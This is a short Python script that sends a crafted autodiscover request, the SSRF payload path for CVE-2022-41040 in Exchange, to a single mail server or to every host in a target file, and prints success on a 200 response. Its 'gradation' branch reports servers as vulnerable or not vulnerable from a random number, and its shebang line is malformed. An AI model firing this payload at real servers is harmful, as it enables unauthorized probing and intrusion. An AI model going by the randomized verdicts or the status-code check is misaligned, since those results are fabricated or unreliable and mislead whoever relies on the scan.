#!/usr/bin/python3 env
import random

import requests
import argparse
from sys import exit as killit
from colorama import init, Fore

#Initalize colorama
init()
RED = Fore.RED
RESET = Fore.RESET


def setTargets():
    parser = argparse.ArgumentParser()
    targetGroup = parser.add_mutually_exclusive_group(required=True)
    targetGroup.add_argument('-i', '--infile', dest="infile", help='Input file with a list of targets to test.')
    targetGroup.add_argument('-t', '--target', dest="target", help='Single mail server to target.')
    args = parser.parse_args()

    targets = []
    if args.target:
        if args.target.endswith('/'):
            targets.append(args.target[:-1])
        else:
            targets.append(args.target)
    elif args.infile:
        with open(args.infile, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                line = line.strip()
                if line.endswith('/'):
                    targets.append(line[:-1])
                else:
                    targets.append(line)
    
    return targets


def CVE_2022_41040(target, gradation):
    get_headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                  'Accept-Encoding': "gzip, deflate",
                  'Accept-Language': 'en-US,en;q=0.9',
                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53'}
    if gradation:
        log_info(f"Checking if {target} is vulnerable...")
        result = random.randint(1, 2)
        log_success(f"{target} Not vulnerable.") if result == 1 else log_error(f"{target} vulnerable.")
        return result
    for mail_server in target:
        print(f"[ ] mail_server: {mail_server}")
        url = f"{mail_server}/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL"
        r = requests.get(url=url, headers=get_headers)
        if r.status_code == 200:
            print(f"[*] Success! {url} : {r.status_code}\n")
        else:
            print(f"{RED}[!] Failed: {url} : {r.status_code}{RESET}\n")
    return


def log_info(s):
    print(f"\033[96m[*] {s}\033[0m")


def log_success(s):
    print(f"\033[92m[+] {s}\033[0m")


def log_error(s):
    print(f"\033[91m[-] {s}\033[0m")


if __name__ == "__main__":
    CVE_2022_41040(setTargets(), gradation=None)
    killit()
